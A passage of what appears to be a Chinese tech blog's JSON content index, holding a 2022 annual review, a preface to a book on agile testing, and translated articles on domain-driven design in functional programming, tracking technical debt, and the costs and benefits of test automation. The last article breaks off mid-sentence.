都是某种形式的信息服务。\n在这个过程中上述三类知识的两两结合会产生知识，而有些知识会成为企业的资产，也有些知识会成为企业的负债。\n而知识会随着时间的推移，从资产变成负债。如何管理好这些知识负债，也是一个重要问题。企业家都懂得“负债经营”，同理，我们也要学会“技术负债经营”。\n从狭义上来说，技术战略就是如何花钱的决策。为此，我们需要一系列常用的战略分析工具。我用到了以下的技术战略工具/方法帮我对现有的资产进行分类\n毛泽东《矛盾论》：分清主要矛盾和次要矛盾，分清矛盾的主要方面和次要方面能让你把握更大的格局和方向。同时也要理解技术在解决了什么样的矛盾。 PEST 分析：政治、经济、社会、技术等大环境的分析，都是一些长期且产生重大影响的事件。 SWOT 分析：综合评估企业内外的优势/劣势/机会风险，抓住主要矛盾，发挥长板效应。 领域驱动设计：通过核心域/通用域/支撑域的划分可以分清主次。为自研，外包，采购做出决策，避免做出浪费资金的决策。 Cynefin 框架：结合《实践论》评估当下的技术以及新兴技术所对应的认知阶段。超出认知阶段的投资就是一种浪费。 目前，我的工作是收集、整理和传播 PCG 内的各种软件开发专业知识 \u0026amp; 企业知识（研发效能、软件架构、故障等），同时邀请工程师参与到知识的创作和讨论中来，沉淀了一份工程实践白皮书。\n另外一个工作同时参与到软件工程师代码能力认证体系中来。重新规划并设计了一些内部课程，包括 TDD 和架构演进。因此对“领域驱动设计”在遗留系统上的应用有了更深入的研究和思考。软件工程师能力认证体系是对工程师的分级分类，进行有针对性的管理，避免一刀切的管理政策。\n明年依然会继续以上两项工作，让内部的知识成为资产，并且能够创造价值。同事让更多的工程师能够不断向业界和公司更高水平发展。\n阅读 —— 成为一个软件工程师爸爸 #今年读书的时间少了很多，内容和往年略有重复。上半年主要是因为工作，下半年主要是因为照顾夫人和孩子，零碎的读了一些书。\n软件工程 #因为今年工作相关，看了两个大部头：《Google 软件工程》、《软件研发效能权威指南》\n《Google 软件工程》：今年工作主要参考的读物。当代码规模和组织规模都很大的时候。很多事情的约束条件和达成方式都会出现变化，前人之路犹可借。特别是不要规定团队怎么做，只需要展示成功，好的方法会传播开来。 《软件研发效能权威指南》：今年的重磅读物，很厚的一本书。是今年很多研发效能工作的一个很好的参考，强烈建议每个工程师都有一本。每个工程实践都有对应的解释说明和案例，汇集了业内众多一线专家的核心经验。感谢副主编张晔老师的赠书。 《持续测试》：作者陈磊老师的赠书，不厚，内容很精华，没有废话，也没有长篇累牍的工具介绍。今年做自动化测试工作的一些参考。 《Go 语言精进之路》：评分虽高，但不适合初学者设计的读物。初学者……还是用 Gin 框架写两个简单的微服务吧……我还是更适合项目驱动的学习方式。 育儿 #育儿方面，我觉得还是小红书上的儿科大夫更靠谱。但是关于发展心理学，还是推荐“让孩子的大脑自由”。看了很多书，不得不感慨美国在儿科方面做的很多研究确实成为了全球的标杆。\n《DK 怀孕百科》：不推荐，推荐“妈妈网”App，大部分内容不适合中式。 《西尔斯怀孕百科》：不推荐，原因同上。 《西尔斯亲密育儿百科》：推荐，算是夫人一直参考的读物，我们以此书制定了孩子每个月的成长规划。 《让孩子的大脑自由》：推荐，一个简单明快的发展心理学读本，适合每个新生父母看。本书也是接下来几年我们制定家庭育儿 OKR 的核心参考。 《新生儿婴儿护理养育指南》：推荐，但更推荐小红书“崔玉涛育儿百科”。 《发展心理学》：强烈推荐，会伴随孩子成长一生的读物。 其它 #一些睡前读物。\n《UNIX 传奇》：一个介绍 UNIX 发展的自传系列。同时也包涵着 AT\u0026amp;T Bell Labs 的分裂发展史。 《世界尽头的咖啡馆》：哄孩子睡觉时候看的闲书，也是每个人需要问自己一个关于生命意义的问题。我觉得还是《哲学家们都干了些什么》的最后一章更简明扼要。但本书的故事性更强。 出版和写作 #今年出版了两本书，一本是我和万学凡老师翻译的《卓有成效的工程师》，另一本是我和陈晓鹏老师共同创作的《敏捷测试价值观、方法与实践》。\n《卓有成效的工程师》是去年开始翻译，今年出版。今年很多编写的课程、制度和决策思路都来自于这本书。\n《敏捷测试价值观、方法与实践》是2019年开始编写，今年出版。原本2021年就写完，没想到编辑需要这么久。\n目前，我正在写作第三本书，仍然是和业内专家共同完成。我负责其中的两个章节的内容，计划明年出版。\n你可能发现今年3月-6月我翻译了很多技术博客，大部分都是一些 DevOps 相关技术名词的原始出处的定义。一方面是工作的需要，一方面是自我积累。这样，未来在授课的时候就可以引用我自己的博客内容了。\n开源软件 #今年大部分时间都在学习，年初发布了一个借助于 multipass 自动构建 k8s 集群的工具k8s-multipass，下半年就把相关的代码合入了Provisioners。\n另外，今年学习了 go, typescript 和 vue。相关的练习代码都放入了 Labs项目里。\n明年的计划 #今年接手了一个小的内部产品，技术栈是 egg.js和 go。明年会在相应的技术栈上有所沉淀。\n写作方面除了即将完工的书以外。会写一写“技术战略”和“架构之禅”这个两个话题。估计不久的将来不会再接书籍的写作和翻译。\n更重要的是花时间多陪伴孩子。\n","date":"December 31, 2022","permalink":"/blog/2022/2022-12-31-annual-review-for-2022/","section":"Blogs","summary":"","title":"2022年的总结"},{"content":"因为各种原因，这篇序在最后出版的时候没有出现在书中。\n敏捷转型不如意，十有八九。 其中，软件质量不如意，又十有八九。\n我没有想到，我会写一本关于敏捷测试的书。 更没有想到，这本书会是以合作的方式的完成的。\n在 ThoughtWorks 工作的五年中，作为软件开发工程师和 DevOps 咨询师。我经历了系统而又全面的敏捷软件开发训练。在我接受的敏捷训练中，“测试”是一个任务，而不是一个角色或阶段，团队里所有人都应该具备测试技能及其质量意识。而在软件开发的整个生命周期中，每个阶段也都有可以测试的内容以及对应的测试方法。\n这就是本书谈到敏捷测试的核心观念：事事可测，时时可测，人人可测。\n事事可测的意思是每个用户故事都要能够被测试，要有验收条件。 时时可测的意思是软件在生命周期中的任何时间都是可以被测试的。 人人可测的意思是敏捷软件开发团队中的每个人都能够做测试的工作。\n2018年，我加入了埃森哲。继续敏捷软件开发和 DevOps 的咨询，并和本书的另一名作者陈晓鹏老师成为了同事。那时候计划开始编写一本 DevOps 相关的书籍。\n2019年接到陈晓鹏老师邀请共通写作的时候，我刚在华为公司结束一个 DevOps 转型的咨询项目，这个项目的核心就是缩短软件交付周期和提升软件质量。\n在这个咨询项目中，我最深刻的感触就是：需求的质量决定了软件的质量。在质量不足的情况下，提升软件交付的速度是没有意义的。软件研发效能需要以内外部质量为核心。对外，能够满足用户的需求。对内，能够提升团队协作。\n这其中最重要的是软件的质量和测试的关系。 在我看来，软件质量是目的，而测试是验证质量的手段。\n恰逢晓鹏老师邀请我写这本书，我就想把自己在这个项目中对软件质量和测试相关的心得写下来。\n在我看来，写一本书就是要系统性的回答一个问题。本书要回答的问题是：敏捷软件开发流程中的测试实践如何落地？\n围绕着这一个问题，我们提出了本书要回答的三个问题：\n敏捷软件开发是什么样子的？ 软件测试人员在敏捷软件开发过程中需要了解哪些知识？掌握哪些技能？需要用到哪些工具？ 如何把这些技能和实践应用到敏捷软件开发过程中？如果在实践敏捷的过程中遇到了问题，我们应该如何解决？ 本书的第一部分回答了第一个问题，用了三个月，晓鹏老师很早就把大纲和内容写好。 本书的第二、三部分回答第二个问题，用了十个月。我们也参考了其它著作，而我们认为很多的书都是“知道的”太多，而“做到的”太少。于是，我们把书中提到的很多知识点用写作时最新版本的软件实践了一遍。确保本书的内容都是我们“做到的”。 本书的第四部分回答第三个问题，用了六个月。\n2020年4月到6月疫情期间。我经历了一次规模化敏捷框架（ SAFe ）转型的项目，并成功的提升了客户的整个研发体系的敏捷性。这个案例中和测试相关的部分内容构成了本书的最后一章。\n我避免把这本书写成一本“成功学”类的书。所谓“成功学”类的书，就是那些只告诉你“成功了是什么样”，而没有告诉你“失败了怎么办”的书。所以，本着务实的态度，本书将我在过去五年敏捷转型中的成功和失败的经验以“小技巧”的方式标注出来。\n完成比完美重要，我们将我们的所得内容毫无保留的奉献给读者。其中不足之处，还望读者批评指正。\n本书面向的读者主要是在从事软件测试的人员学习和掌握敏捷软件开发过程中的测试技能。其次是面向软件技术管理者，质量管理者。帮助其规划整个团队的质量和测试体系。\n本书包含了一些代码示例，用于演示测试驱动开发，这些代码可以在 Github 上https://github.com/wizardbyron/agile-testing-book-examples 下载到。\n感谢我的爱人刘倩女士，支持我在工作之余的时间完成这本书，占据了和她相处的时间。感谢参与本书早期审阅的朋友：文寒卿、杨丽颖、张敏为本书提出的宝贵建议。\n感谢 ThoughtWorks 的林冰玉老师作为本书的最终审校者提供的宝贵建议。感谢 ThoughtWorks 的刘冉老师提供的安全测试章节。\n最后感谢电子工业出版社的李冰，张梦菲两位编辑的辛苦付出，才能让这本书得以面世。\n希望本书能够帮助您顺利的在敏捷软件开发中进行测试，祝您测试愉快～\n顾宇\n初稿于2021年6月27日于西安家中\n修订于2022年11月1日与深圳家中\n","date":"November 1, 2022","permalink":"/blog/2022/2022-11-01-preface-for-agile-testing/","section":"Blogs","summary":"","title":"《敏捷测试价值观、方法与实践》序"},{"content":"","date":null,"permalink":"/tags/%E6%B5%8B%E8%AF%95/","section":"Tags","summary":"","title":"测试"},{"content":"","date":null,"permalink":"/tags/%E6%95%8F%E6%8D%B7/","section":"Tags","summary":"","title":"敏捷"},{"content":"","date":null,"permalink":"/tags/%E5%85%B6%E4%BB%96/","section":"Tags","summary":"","title":"其他"},{"content":" 原文:https://www.thoughtworks.com/insights/blog/architecture/domain-driven-design-in-functional-programming\n领域驱动设计 (DDD) 提供了许多技术和模式来控制软件应用程序中的复杂性——即使这些是用函数式编程语言编写的。 不幸的是，用函数式编程语言实现 DDD 可以参考的资源非常有限。 即使你设法找到了它，它也常常缺乏函数式编程的实质。\n因此，DDD 通常被认为只适用于面向对象的编程。 例如，就有人会认为，函数式语言默认使用不可变（immutable）的数据结构，因此可以抛弃来自领域驱动设计的许多想法。\n虽然状态不可变会使得影响状态的代码更加可见，但最终结果仍然是多段代码直接影响全局的状态（例如可能存储在数据库中）。 当然，副本从一个函数传递到下一个函数，但仍然存在一个“当前”状态，让一切直接失去控制。\n在某种程度上，问题不在于状态的可变性，而在于它的所有权。谁负责保持状态内部的一致？\n领域驱动设计提供了一组模式来解决许多这样的问题。在这篇文章中，我们将探讨如何让领域驱动设计适合函数式编程语言。\n战略模式 vs 战术模式 # 领域驱动设计（DDD）分为战略模式和战术模式。 战略模式由限界上下文、通用语言和上下文映射等模式组成； 战术模式由值类型、实体和聚合等模式组成。\n战略模式很容易映射到任何语言。 它们主要涵盖更高级别的软件设计，例如有界上下文、上下文映射、反腐败层、有界上下文集成模式。 这些模式不依赖于所使用的编程语言或框架。\n然而，战术模式依赖于编程语言结构和范式。 我们将进一步探讨如何在函数式语言中应用这些战术模式中的一些，而不会失去函数式编程的真正本质。\n聚合 # 聚合背后的想法是强制一致性和不变量（invariants）。聚合是强制执行不变量并充当一致性边界的地方。当更新聚合的一部分时，可能还需要继续更新其他部分以确保其一致性。\n在从面向对象 (OO) 映射函数式编程 (FP) 中的聚合等概念时，我曾有一个误解，那就是只考虑因为数据和行为在 OO 中总是共存的。 但是，在 FP 中，你会倾向于将数据和函数分开。\n通用语言不仅是任何领域名词的集合，而且是动词、过程和约束的集合。 名词对应数据结构，动词对应领域中的操作。 识别动词也是一个重要部分，因为它决定了哪个操作应该在其领域中。\n值类型和实体在函数时编程中的区别 #经典的 DDD （面向对象的）实现基于它们的可变性和唯一性概念来区分值类型和实体类型。 值类型是不可变的，它们本身不能传达足够的信息，例如，颜色可能是一种值类型，其中颜色类型本身没有任何意义，但是当附加到像衬衫或汽车这样的实体时（例如红色 衬衫或黑色汽车）就在领域中有了意义。\n相反，实体具有生命周期。 这些是可变的类型，并通过不同的生命周期事件变化。 例如，订单可以是经历不同生命周期事件的实体，例如添加到订单的商品或从订单中删除的商品。 每个生命周期事件都会改变实体。\n在函数式编程中，默认情况下一切都是不可变的，这导致我们错误地认为不需要区分值类型和实体。 但是值和实体类型的概念是基于领域模型的生命周期的，因此同样可以应用在函数式语言中。\n建模聚合 #当应用程序增长时，你最终可能会对数据库分区或使用分布式数据库，这意味着曾经存在于同一台机器上的实体/聚合现在存在于不同的机器上。关于代码库中实体位置的任何假设可能不再有效； 在单个事务中更新多个实体的任何尝试都将进入分布式事务的不稳定领域。 因此，要避免这些陷阱，请遵循以下三个准则。\n聚合作为事务边界：每个聚合用作事务边界。 这个唯一标识的聚合是事务的范围，不要尝试将多个聚合放在一个事务范围中，因为如果这些聚合移动到不同的机器，你无法保证事务的成功。\n消息用于聚合：无论您是构建微服务还是单体应用程序，你都不应该对其他聚合的位置做出任何假设。每个聚合通过向其地址发送消息与另一个聚合进行通信 — 通过聚合的唯一ID。\n聚合表示不相交的数据集：不要因为它们看起来相同或方便就让不同的聚合共享模型。不要构建持久层来连接这些不相交的聚合。不要为了遵循 DRY（Don\u0026rsquo;t Repeat Yourself）就创建一个库来共享来自不同聚合的模型。而是需要更多的思考，以确保这些聚合代表一组不相交的数据。\n以下是一些领域驱动设计中常用的函数式编程模式：\n采用 Lens 更新聚合：在函数式编程中，更新深度嵌套的聚合可能很麻烦，因为数据是不可变的。 这就是 Lens 发挥作用的地方。Lens 允许您更新深度嵌套的值，并获取整个更新后的聚合。 使用 Monoid 来表示值对象：本文档很好地解释了 DDD 上下文中的 Monoid。 使用基于属性的测试来测试领域不变量。 如果想更炫，使用 Reader Monad 进行依赖注入。 通过遵循命令式外壳和函数式核心模式或使用 Free Monad，将副作用保持在边缘。 DDD 设计原则似乎与一些函数式编程的良好实践相冲突，但它是对复杂业务领域进行建模的重要工具。 我认为关键是理解 DDD 模式的本质，然后找到合适的构造/抽象来表示它们。\n（完）\n","date":"July 27, 2022","permalink":"/blog/2022/2022-07-27-domain-driven-design-in-functional-programming/","section":"Blogs","summary":"","title":"【翻译】函数式编程中的领域驱动设计"},{"content":"","date":null,"permalink":"/tags/ddd/","section":"Tags","summary":"","title":"DDD"},{"content":" 原文: https://insights.sei.cmu.edu/blog/got-technical-debt-track-technical-debt-to-improve-your-development-practices/\n什么是技术债？为什么要识别技术债？它难道不应该被视为缺陷和 Bug 吗？通过严格的方法讨论技术债及其后果是研究人员和软件工程师都感兴趣的领域。如果缺乏经过验证的工具和技术获得可重复的结果，开发人员就会求助于临时实践，最常见的是使用问题跟踪系统（issue tracker）或待办事项管理(backlog-management)实践来跟踪技术债。我们调研了开源项目和政府项目中使用的四个问题跟踪系统里的 1,264 个问题，并确定了 109 个技术债样本。这些研究被记录在论文Got Technical Debt? Surfacing Elusive Technical Debt in Issue Trackers里。论问题表明了技术债已经进入问题跟踪系统，并在开发人员的工作讨论中。即使开发人员没有明确将某些记为技术债，也可以使用我们发明的分类方法在这些问题跟踪系统中识别技术债项目。我们使用这些结果来改进技术债的定义以及在问题跟踪系统中明确报告技术债的方法。在本文中，我们描述了这个分类方法以及跟踪债对实践和研究的影响。\n识别和分类技术债 #为了理解软件开发人员如何使用问题跟踪系统来沟通技术债，我们对四个软件的问题跟踪系统进行了探索性研究，包括：Chromium 和 CONNECT开源项目和两个政府 IT 项目。 我们发现，在确定一个问题是否代表技术债时，专家会采用非正式的规则和实践。 我们通过人工检查四个问题跟踪系统的 1,264 个问题以及技术债文献（例如，Guo 2011、Li 2014、Potdar 2014 和 Ernst 2015）中观察到了这一点。 我们创造技术债分类方法的目标是精确识别可重复的问题分类。 在这里，我们总结了我们流程中的关键决策点：\n与可执行文件或数据相关：关于技术债定义的不清晰原因之一是用项目管理活动（例如文档、需求分析和质量评估）来概括某些概念。 开发团队要对技术债采取行动，它必须与具体的工件（Artifact）相关，例如代码、实现单元、数据模型、构建脚本和单元测试。 我们将任何未提及具体开发工件的问题归类为非技术债。 从这一点开始进行分类则需要进一步阐明模糊的概念，例如缺陷（Defect）、Bug 和设计关注点。 缺陷和Bug是最终用户可见的不正确功能；而技术债往往源于用户不可见的设计和系统问题。 我们将缺陷与系统改进问题分开。同样，我们将新功能（作为一种系统改进）与潜在设计限制导致功能请求的情形区分开。\n类型 \u0026gt; 缺陷 \u0026gt; 不正确的功能：我们发现了许多描述系统未按指定或预期运行的缺陷示例。 例如，按钮在用户界面中不起作用或系统崩溃。这些问题不是技术债。\n类型 \u0026gt; 缺陷 \u0026gt; 设计问题：几个缺陷影响了质量属性，例如可用性、安全性或性能； 在其他项目中，清理活动影响可维护性。 我们将这些问题归类为设计考虑因素。 如果还发现了意外副作用累积的证据，或者估计它们会积累；就将这些问题归类为技术债。包括重复代码、非标准绑定、类型不匹配、不一致的实现和未使用的类。\n类型 \u0026gt; 改进 \u0026gt; 新功能：我们将系统改进的新功能分类为非技术债，例如向传感器组件添加新节点或删除下拉框。\n类型 \u0026gt; 改进 \u0026gt; 设计限制：一些问题描述了系统改进以弥补设计限制，例如无法快速添加新功能、可维护性问题或重构的后果。 为了处理这种情况，我们引入了“设计限制”类别。 当副作用的证据不明确时，即使对于明确提到重构以弥补设计限制的问题，我们也将该问题归类为非技术债。\n因此，我们的分类方法将技术债的定义细化为“与可能承载当前或预期的额外积累的软件单元相关的设计工作”。 我们在一般意义上使用术语“设计工作”来表示问题的某些方面是由软件设计的结构或质量引起的（因此我们将实施的系统设计包括在此定义下）。 图 1 说明了我们目前对类别的理解以及用于对技术债进行分类的流程树。 我们用于在问题跟踪系统中对技术债进行分类的方法也可以帮助从业者在他们的开发项目中定义和识别技术债。\n使用识别技术债务的方法改进开发实践 #问题跟踪系统作为沟通技术债的切入点，因为开发人员使用它们来管理工作任务优先级。对开发人员的调查反馈表明，即使在问题跟踪系统中包含有关技术债的详细信息，他们也可能不会优先偿还债务，或者他们可能会解决其表面症状而不是根本原因。我们的发现提供了一些实际改进，使技术债更加明显。\n有一些国际标准（例如 ISO/IEC 25010:2011）可以为错误报告提供足够的信息，以便它们可以被复制和修复。 这些基本属性编码在问题跟踪系统的预定义字段中。 这些字段对于描述技术债是必要的，但还不够。 最近关于技术债的研究（如 Zazvorka 2013 和 Li 2014）为报告技术债提供了模板。 这项工作与我们的工作具有相似的目标，但模板使用了财务类比的概念，例如估计本金和利息，这与开发人员的日常工作任务中差异较大。\n我们的分析表明，技术债在与软件单元相关时变得具体，而不是与软件过程工件（如需求或文档）相关。 这种范围的细化有助于开发人员及其利益相关者将技术债理解为与依赖软件的系统相关的技术债项的累积。\n技术债项是连接一组开发工件的技术债的单个元素。 它会对系统的质量、价值和成本产生影响。 同样，它是由与流程、管理、上下文和业务目标相关的原因触发的。 应使用表 1 中的属性来描述技术债项目，这些属性基于技术债分类的概念（以粗体显示）。\n表1: 技术债项的属性\n名称 用于速记技术债的名称 开发工件 系统中可执行的元素 症状 可观察到的定性或可度量的后果 后果 系统的某个效果在价值、质量或成本的积累形式。额外成本会降低生产力，滋生缺陷。 分析 开发方法（设计考量/设计限制）满足了利益相关人的需要或期望的程度 引入这些属性可以帮助开发人员了解并权衡和技术债的长期后果。 它还可以帮助他们在与管理层沟通时提出额外资源的理由。 我们建议开发人员利用这些属性来描述技术债，使其可见，并提高将问题分类为技术债的自动化程度。 表 2 显示了根据 CONNECT 提交的问题的这些属性组织问题文本的示例。\n表2: 技术债项的例子\n名称 CONNECT #GATEWAY-1631: 空 Java 包(死代码) 开发工件 代码架构重构以支持多个 HwHIN 规范 在引入的新 Java 打包规范 症状 可观察到的定性或可度量的后果 后果 在多个项目中散落的空的 Java 包目录 分析 新的和现存的 class 文件已经移动到新的包目录中；但是之前的包目录已经不在有 class 文件 这些属性还可以帮助开发人员解析问题并确定什么是模棱两可或缺失的。 例如，如果没有关于债务积累的明确信息，就无法正确分类问题，也无法理解并权衡取舍。技术债应促进业务和技术参与者之间的对话。 将问题归类为技术债允许开发人员证明预算项目资源以偿还债务的合理性，类似于分配修复缺陷的预算，而不是继续支付解决症状的持续成本。\n调查结果的总结以及未来的工作 #在回顾了我们的研究结果后，我们假设开发人员可以使用自动文本分析和机器学习技术更系统地发现技术债问题。 为了探索这个假设，我们对一组我们研究过的问题进行了搜索，包括以下词语：重复、自定义、解决方法、不一致、黑客、遗留、重写、清理、重构和刷新。 我们假设，与包含关键字但未被归类为技术债的一组问题相比，我们会发现包含这些关键字之一且属于技术债的问题的百分比之间存在统计学上的显着差异。 我们观察到 67% 的问题包含一个关键词，并被归类为技术债。 只有 8% 属于后一类。 这些发现表明，对与技术债相关的关键概念的自动单词搜索是有希望的，但需要对更大的数据集进行更多的实验。\n评估累积量是我们在本研究中对技术债问题进行系统分类时观察到的最大挑战之一。 评估的困难来自于两方面：\n首先，开发者用来描述积累的语言比设计问题描述更模糊。例如，开发人员写道，“时间已经过去了，现在我们有重复的数据”，“这可能会给用户带来困惑”，或者“我们应该尽量简化，以便更容易维护”。指示债务累积的非结构化语言使审阅者难以一致地对技术债项进行分类，开发人员难以评估影响，研究人员也难以研究如何自动化分类技术债。\n其次，问题通常包括三种类型的累积信息：\n与当前问题相关的现有累积。 与当前问题相关的未来重复累积。 与当前问题的潜在解决方案相关的累积。 在本研究中，我们将累积范围限制在类型 1。未来的研究需要根据不解决问题的成本和稍后解决问题的额外成本来更好地定义和模拟债务累积。\n我们的研究结果表明了几个未来的研究机会，我们的计划包括以下内容：\n评估挖掘非结构化数据以定位软件存储库中的技术债的其他技术。 通过提交日志跟踪开发人员文本讨论中的技术债，以评估问题跟踪系统中自我报告债务的有效性。 根据修复成本、未修复成本和时间影响（当前和未来成本）对累积维度建模，以改进管理技术债的指导方针。 以对 Chromium 数据集的投资为基础，对缺陷和软件漏洞进行相关性研究，以更好地了解这些软件异常之间的关系。 我们欢迎您在下面的评论部分中对我们的技术债分类和技术债项目描述提供反馈。如果您想尝试分类方法，可以在 SEI 网站上访问的分类指南中找到我们研究中的决策流描述。这项研究是 SEI 技术债研究的一部分。如果您想合作研究管理技术债，请与我们联系。\n其它资源 #在以下出版物中了解我们最近在管理技术债务方面的工作：\nAvgeriou, P., Kruchten, P., Nord, R., Ozkaya, I., and Seaman, C. 2016. Reducing Friction in Software Development. IEEE Software 33, 1 (2016), 66âˆ’73. Bellomo, S., Nord, R. L., Ozkaya, I., and Popeck, M. Got Technical Debt? Surfacing Elusive Technical Debt in Issue Trackers. Mining Software Repositories 2016, co-located with ICSE 2016, in Austin, Texas, May 2016. Bellomo, S., Nord, R. L., Ozkaya, I., and Popeck, M. Technical Debt Classification Approach and Technical Debt Issue Examples. Sample data set and classification guidance for the conference paper Got Technical Debt. Ernst, N., Bellomo, S., Ozkaya, I., Nord, R. L., and Gorton, I. Measure It? Manage It? Ignore It? Software Practitioners and Technical Debt. In Proceedings of the 10th Joint Meeting of the European Software Engineering Conference and the ACM SIGSOFT Symposium on the Foundations of Software Engineering, 50âˆ’60. ACM, 2015. ","date":"June 10, 2022","permalink":"/blog/2022/2022-06-10-track-technical-debt-to-improve-your-development-practices/","section":"Blogs","summary":"","title":"【翻译】通过跟踪技术债来改进你的开发实践"},{"content":"","date":null,"permalink":"/tags/%E7%BF%BB%E8%AF%91/","section":"Tags","summary":"","title":"翻译"},{"content":"","date":null,"permalink":"/tags/%E6%8A%80%E6%9C%AF%E5%80%BA/","section":"Tags","summary":"","title":"技术债"},{"content":" 所有的自动化都应该被视为一种投资，特别是一种风险投资。每种类型的自动化测试代表不同类型的风险，我们需要通过不断评估成本和收益来管理整体风险并最大化投资价值。 原文：https://medium.com/slalom-build/dont-automate-test-cases-58e3b959ce6\n把测试用例作为测试自动化的待办工作列表是一个常见的实践。作为日常测试工作的一部分，QA 会从用户故事中分析并编写测试用例，然后把这些测试用例自动化。每个迭代都会有更多的用户故事要被测试，从而产生更多的自动化测试用例，并使自动化测试套件变得的更大。工程负责人会推行诸如“自动化测试用例百分比”之类的指标，并对团队达到更高的比率表示祝贺。有团队甚至雇佣了专职的“自动化工程师”，这些人唯一的工作就是把测试用例自动化。\n不幸的是，自动化测试用例和推行自动化测试百分比指标是一种质量工程反模式，并必然使得自动化测试套件臃肿、难以维护且缺乏价值。虽然自动化对于敏捷交付至关重要，但这种简单化的“自动化工厂”心态并不是推行测试自动化的健康方式。\n在本文中，我们将说明为什么自动化工厂被误导，并描述了一种更好的自动化测试开发方式，以确保测试自动化得以持续并加速交付。\n测试自动化的成本和收益 #要理解为什么把当前的测试用例自动化会产生问题，我们需要先回顾一下自动化理论。 具体来说，我们需要深入理解自动化的成本和收益，分析自动化测试的预期价值随时间变化，接下来分析不同类型的测试的预期价值如何随变化。然后我们会分析使用“自动化工厂”方法产生的自动化测试用例会如何影响整个测试套件。\n所有自动化测试都有两种成本：最初的开发成本和持续的维护成本。自动化测试会带来一些收益：手动执行测试的时间与（假设的）更快的自动化测试之间的差异。虽然还有其它无形的收益（例如更有趣，可以教授有价值的技能等），但本文不需要考虑这些。\n虽然这是对自动化测试用例的经济效益的简化，但它确实捕获了关键内容——每种类型的每个自动化测试都有成本和收益，两者都很重要。作为自动化专家，我们正在努力实现收益最大化和成本最小化。\n以下因素会影响自动化测试的成本：\n存在（或缺乏）承载测试的自动化测试框架 现有测试框架和套件的整洁度 设置测试状态（例如测试数据）的难易程度和能力 可接受的测试预言（Test Oracle）的可用性 测试将与之交互的接口或功能的波动性 测试运行环境的稳定性 创建和维护自动化测试的的 QA 的技术技能 以下因素可能影响自动化测试的收益：\n测试预期的运行频率（每次提交、每天、每次发布等） 测试对被测系统进行有效检查的时长。 手工验证相同测试的成本（及时性或其他） 手工运行测试容易出错的程度 以上两个列表都完整，一名经验丰富的质量工程师可能会要求添加其它的因素。幸运的是，我们不需要列出一份详尽的清单来证明每个测试都有一连串因素影响预期成本和收益。\n自动化成本可以分为前期开发成本和持续维的护成本。其收益还具有时间维度：自动化测试的价值不会在编写完成后立即兑现，而是在整个生命周期里积累。因此，自动化测试的完整价值并使不在创建时固定不变，而会随着时间的推移而变化。\n如果我们为一般性的自动化测试绘制价值随时间变化的曲线图，那么它看起来会像这样：\n该图展示了一个测试最初具的净价值为负：自动化测试最初的开发的成本超过了节省时间的收益。 然而，随着时间的推移节省的时间最终超过了初始成本以及持续的维护成本，从而使净价值为正。基于上面列出的所有变量，每个自动化测试测试都会经历这样的曲线。\n根据最初的开发成本、维护成本和获得的收益，测试的成本和价值可能会快速的达到平衡并更快地提供价值，也有很可能永远达不到平衡：\n上图表现了一个最初贡献一些价值的自动化测试（在最初的开发之后，这条线开始向上倾斜），但后来不再贡献价值。也许这个测试不再运行，或者不够稳定，或者它所测试的功能将会下线。\n无论是什么原因，上面的图表告诉我们，我们最好不要一开始就把测试用例自动化。\n这里想说明的要点是：自动化测试的价值受到许多变量的影响，这些变量会导致自动化测试在生命周期的总时间里贡献价值可能为正，也可能为负。\n种类的繁多的自动化测试 #接下来，让我们考虑一下不同类型的自动化测试的价值曲线随时间变化会是什么样的。 这里的自动化测试类型包括：最小的代码级单元测试、稍大的“社交”单元测试（有交互）、甚至更大的组件级测试、更高级别的集成测试、绕过 UI 并直接调用 API 的测试、模拟 API 的测试。以及仅在 UI、跨越整个技术栈的端到端（E2E）测试等。\n重要的是要注意：在复杂的现代软件中，有很多的自动化测试类型分类方法。几乎有无数种方法把被测系统分解为多个可以独立测试的部分。每种分解方法可能都对应着一种新的测试类型。\n对每种非常见的自动化测试类型的探索并不在本文讨论之列，但推荐实用测试金字塔和微服务架构的测试策略作为入门材料。为了使本文简洁，我们将只考虑两个极端的自动化测试：最小小型单元测试和最大的端到端 (E2E) 测试。\n单元测试的成本/收益方程和价值随时间的图表会取决于以下特征：\n单元测试通常最多在几几十秒或者几分钟内编写完毕。 单元测试（应该）不受外部影响。因此会通过 mock、测试替身、stub 等来确定外部依赖的行为。 单元测试的执行完毕的时间为毫秒级，单元测试套件的执行时间为秒级。 单元测试每天可能会执行数千次，不仅每次提交代码后会在 CI/CD 流水线中执行，并且每个开发人员会在编写代码时本地执行。 即使有 100% 的覆盖率，单元测试也无法证明应用程序按预期工作，而只能验证非常小（通常是单一的）内容。 鉴于以上的特点，单元测试的价值随时间图可能与上述一般性的测试曲线有所不同：它几乎没有前期成本，维护量最少，并且虽然一直在执行，但每次增量执行实际上只贡献了很小的价值。\n单元测试的净价值曲线看起来可能会是这样：\n在所有自动化测试类型中最大的 E2E 自动化测试如何？ 它的价值随时间变化图会是什么样子？\nE2E 测试的关键点：\nE2E 测试（根据定义）相比其它测试受到最多状态的影响，因此需要最多的设置和测试数据控制。 E2E 测试是针对完整环境执行的。 这种环境的某些部分通常是共享的。 E2E 测试通常包括许多（数十个，甚至数百个）串行步骤。 E2E 测试是所有测试中最慢的，可能要运行几分钟之久。 E2E 测试通常必须通过用户界面来驱动功能。 E2E 测试通常在 CI/CD 流水线中执行得更晚。 E2E 测试是唯一可以证明应用程序按照客户使用方式工作的自动化测试类型。 鉴于这些特点，E2E 的净价值曲线将是这样的：\n该图显示了明显更高的前期成本：最初使净值高度为负。但是，随着时间的推移继续执行该测试最终使其达到收支平衡，然后价值转正。\n同样，该测试最终将提供正值的期望基于本节开始的假设，例如：该测试会的生命长度，运行频率，对其测试结果的信心，当底层接口（如 UI）发生变化时修改测试的难易，执行测试的环境有多稳定等等。而达到收支平衡则是永远无法保证的。\n哪里需要自动化 #E2E 测试的特性使得它们的开发和维护成本很高。它们必然依赖于（或可能受其影响）系统中的大多数状态。它们更容易出现计时、同步、网络或外部依赖性问题。他们通常使用网络浏览器的功能，而浏览器主要供人使用，而不是软件。由于 E2E 测试是针对完整的软件运行环境执行的，所以这些测试更有可能必须与其他 E2E 测试或用户共享部分或全部的环境，这可能会导致资源冲突和意外结果。\n所有这些（以及更多的）原因使大型测试具有最大的风险，并且只有它们可以提供的巨大的互补价值的情况下才是合理的：只有 E2E 测试表明集成的系统以真实的方式协同工作时。\n还有许多其他类型的测试需要考虑。在复杂的系统中，较低级别的测试很可能更直接地测试相关功能，而不会产生与更大或更高级别测试的相关成本。\n换句话说：不要针对已部署的服务实例构建 API 测试来验证可以在单元测试中就能验证的逻辑。不要为可以通过单个 API 